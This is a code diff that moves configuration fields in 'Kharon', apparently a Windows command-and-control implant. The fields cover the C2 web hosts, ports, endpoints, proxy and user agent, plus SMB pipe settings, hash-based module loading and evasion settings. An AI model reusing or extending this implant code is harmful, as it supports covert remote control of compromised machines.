@@ -159,30 +159,30 @@ auto DECLFN Kharon::Init(
     this->Config.Guardrails.IpAddress  = Cfg.Guardrails.IpAddress;
     this->Config.Guardrails.HostName   = Cfg.Guardrails.HostName;
 
-    this->Tsp->Web.HostQtt     = Cfg.Web.HostQtt;
-    this->Tsp->Web.PortQtt     = Cfg.Web.PortQtt;
-    this->Tsp->Web.EndpointQtt = Cfg.Web.EndpointQtt;
+    this->Config.Web.HostQtt     = Cfg.Web.HostQtt;
+    this->Config.Web.PortQtt     = Cfg.Web.PortQtt;
+    this->Config.Web.EndpointQtt = Cfg.Web.EndpointQtt;
 
-    this->Tsp->Web.Host     = (WCHAR**)this->Ntdll.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, this->Tsp->Web.HostQtt     * sizeof( WCHAR* ) );
-    this->Tsp->Web.Port     = (ULONG* )this->Ntdll.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, this->Tsp->Web.PortQtt     * sizeof( ULONG  ) );
-    this->Tsp->Web.EndPoint = (WCHAR**)this->Ntdll.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, this->Tsp->Web.EndpointQtt * sizeof( WCHAR* ) );
+    this->Config.Web.Host     = (WCHAR**)this->Ntdll.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, this->Config.Web.HostQtt     * sizeof( WCHAR* ) );
+    this->Config.Web.Port     = (ULONG* )this->Ntdll.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, this->Config.Web.PortQtt     * sizeof( ULONG  ) );
+    this->Config.Web.EndPoint = (WCHAR**)this->Ntdll.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, this->Config.Web.EndpointQtt * sizeof( WCHAR* ) );
 
-    COPY_WEB_ARRAY( this->Tsp->Web.Host,     Cfg.Web.Host,     this->Tsp->Web.HostQtt     );
-    COPY_WEB_ARRAY( this->Tsp->Web.Port,     Cfg.Web.Port,     this->Tsp->Web.PortQtt     );
-    COPY_WEB_ARRAY( this->Tsp->Web.EndPoint, Cfg.Web.EndPoint, this->Tsp->Web.EndpointQtt );
+    COPY_WEB_ARRAY( this->Config.Web.Host,     Cfg.Web.Host,     this->Config.Web.HostQtt     );
+    COPY_WEB_ARRAY( this->Config.Web.Port,     Cfg.Web.Port,     this->Config.Web.PortQtt     );
+    COPY_WEB_ARRAY( this->Config.Web.EndPoint, Cfg.Web.EndPoint, this->Config.Web.EndpointQtt );
 
     if ( Cfg.Web.Host )     this->Ntdll.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Cfg.Web.Host );
     if ( Cfg.Web.Port )     this->Ntdll.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Cfg.Web.Port );
     if ( Cfg.Web.EndPoint ) this->Ntdll.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Cfg.Web.EndPoint );
 
-    this->Tsp->Web.Method        = Cfg.Web.Method;
-    this->Tsp->Web.ProxyEnabled  = Cfg.Web.ProxyEnabled;
-    this->Tsp->Web.ProxyUrl      = Cfg.Web.ProxyUrl;
-    this->Tsp->Web.ProxyUsername = Cfg.Web.ProxyUsername;
-    this->Tsp->Web.ProxyPassword = Cfg.Web.ProxyPassword;
-    this->Tsp->Web.UserAgent     = Cfg.Web.UserAgent;
-    this->Tsp->Web.HttpHeaders   = Cfg.Web.HttpHeaders;
-    this->Tsp->Web.Secure        = Cfg.Web.Secure;
+    this->Config.Web.Method        = Cfg.Web.Method;
+    this->Config.Web.ProxyEnabled  = Cfg.Web.ProxyEnabled;
+    this->Config.Web.ProxyUrl      = Cfg.Web.ProxyUrl;
+    this->Config.Web.ProxyUsername = Cfg.Web.ProxyUsername;
+    this->Config.Web.ProxyPassword = Cfg.Web.ProxyPassword;
+    this->Config.Web.UserAgent     = Cfg.Web.UserAgent;
+    this->Config.Web.HttpHeaders   = Cfg.Web.HttpHeaders;
+    this->Config.Web.Secure        = Cfg.Web.Secure;
 
     /* ========= [ init modules and funcs ] ========= */
     this->Mscoree.Handle   = LdrLoad::Module( Hsh::Str<CHAR>( "mscoree.dll" ) );
@@ -431,24 +431,24 @@ auto DECLFN Kharon::Init(
     KhDbgz("profile c2: %X", PROFILE_C2);
 
 #if PROFILE_C2 == PROFILE_WEB
-    for ( INT i = 0; i < this->Tsp->Web.HostQtt; i++ ) {
-        KhDbgz( "Host: %S", this->Tsp->Web.Host[i] );
-        KhDbgz( "Port: %d", this->Tsp->Web.Port[i] );
+    for ( INT i = 0; i < this->Config.Web.HostQtt; i++ ) {
+        KhDbgz( "Host: %S", this->Config.Web.Host[i] );
+        KhDbgz( "Port: %d", this->Config.Web.Port[i] );
     }
 
-    for ( INT i = 0; i < this->Tsp->Web.EndpointQtt; i++ ) {
-        KhDbgz( "Endpoint: %S", this->Tsp->Web.EndPoint[i] );
+    for ( INT i = 0; i < this->Config.Web.EndpointQtt; i++ ) {
+        KhDbgz( "Endpoint: %S", this->Config.Web.EndPoint[i] );
     }
 
-    KhDbgz( "WebMethod: %S", this->Tsp->Web.Method );
-    KhDbgz( "User Agent: %S", this->Tsp->Web.UserAgent );
-    KhDbgz( "Headers: %S", this->Tsp->Web.HttpHeaders );
-    KhDbgz( "Secure: %s", this->Tsp->Web.Secure ? "TRUE" : "FALSE" );
-    KhDbgz( "Proxy Enabled: %s", this->Tsp->Web.ProxyEnabled ? "TRUE" : "FALSE" );
-    KhDbgz( "Proxy URL: %S\n", this->Tsp->Web.ProxyUrl );
+    KhDbgz( "WebMethod: %S", this->Config.Web.Method );
+    KhDbgz( "User Agent: %S", this->Config.Web.UserAgent );
+    KhDbgz( "Headers: %S", this->Config.Web.HttpHeaders );
+    KhDbgz( "Secure: %s", this->Config.Web.Secure ? "TRUE" : "FALSE" );
+    KhDbgz( "Proxy Enabled: %s", this->Config.Web.ProxyEnabled ? "TRUE" : "FALSE" );
+    KhDbgz( "Proxy URL: %S\n", this->Config.Web.ProxyUrl );
 #endif
 #if PROFILE_C2 == PROFILE_SMB
-    KhDbgz( "SMB Pipe Name: %s\n", this->Tsp->Pipe.Name );
+    KhDbgz( "SMB Pipe Name: %s\n", this->Config.Pipe.Name );
 #endif
 
     KhDbgz("======== Evasion Settings ========");
